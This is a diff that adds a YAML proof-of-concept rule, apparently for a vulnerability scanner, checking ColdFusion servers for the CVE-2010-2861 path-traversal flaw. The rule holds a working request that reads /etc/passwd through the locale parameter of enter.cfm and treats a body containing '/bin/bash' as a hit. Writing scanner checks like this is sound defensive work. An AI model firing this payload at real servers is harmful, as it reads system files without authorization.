@@ -1,0 +1,13 @@
+name: poc-yaml-clodfusion-readfile
+rules:
+  - method: GET
+    path: /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en
+    headers: 
+      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
+    expression: 
+      status == 200 && body.bcontains(b'/bin/bash')
+detail:
+  description: clodfusion-readfile
+  vulnpath: /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en
+  author: w3bdoge
+  vulhub: https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/
